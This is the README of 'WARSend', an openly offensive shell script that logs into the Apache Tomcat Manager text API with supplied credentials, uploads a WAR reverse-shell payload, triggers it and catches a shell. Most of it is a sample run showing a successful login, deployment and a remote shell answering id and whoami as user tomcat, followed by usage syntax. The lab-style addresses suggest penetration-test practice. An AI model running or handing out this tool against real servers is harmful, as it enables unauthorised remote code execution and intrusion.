# WARSend

Apache Tomcat Manager API WAR Shell Upload

## Prerequisites

* Credentials
* Text API Access to Tomcat Manager

```bash
$ ./warsend.sh 10.10.14.232 8090 10.10.10.184 8080 tomcat \$3cureP4s5w0rd! revshell

 _       _____    ____  _____                __
| |     / /   |  / __ \/ ___/___  ____  ____/ /
| | /| / / /| | / /_/ /\__ \/ _ \/ __ \/ __  /
| |/ |/ / ___ |/ _, _/___/ /  __/ / / / /_/ /
|__/|__/_/  |_/_/ |_|/____/\___/_/ /_/\__,_/

[>] Created By : thewhiteh4t
[>] Version    : 1.0.0

[+] LHOST                  : 10.10.14.232
[+] LPORT                  : 8090
[+] RHOST                  : 10.10.10.184
[+] RPORT                  : 8080
[+] Username               : tomcat
[+] Password               : $3cureP4s5w0rd!
[+] Reverse Shell Filename : revshell
[+] Payload                : java/jsp_shell_reverse_tcp

[!] Checking Dependencies...

[!] Testing Tomcat Manager Text API Access...

[+] Login Successful!

[+] Generating WAR Reverse Shell...
Payload size: 1102 bytes
Final size of war file: 1102 bytes

[!] Uploading WAR File...
OK - Deployed application at context path [/revshell]

[!] Triggering Reverse Shell...

[+] Starting Listener...
Connection from 10.10.10.184:41948
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
whoami
tomcat
exit

[!] Cleaning Up...
OK - Undeployed application at context path [/revshell]
```

## Tested on

* Apache Tomcat 9

## Usage

```bash
* All Values are Required *
* Input Filename Without File Extension *

./warsend.sh LHOST LPORT RHOST RPORT Username Password Filename

Example : ./warsend.sh 10.10.13.37 1337 10.10.10.184 8080 tomcat tomcat revshell
```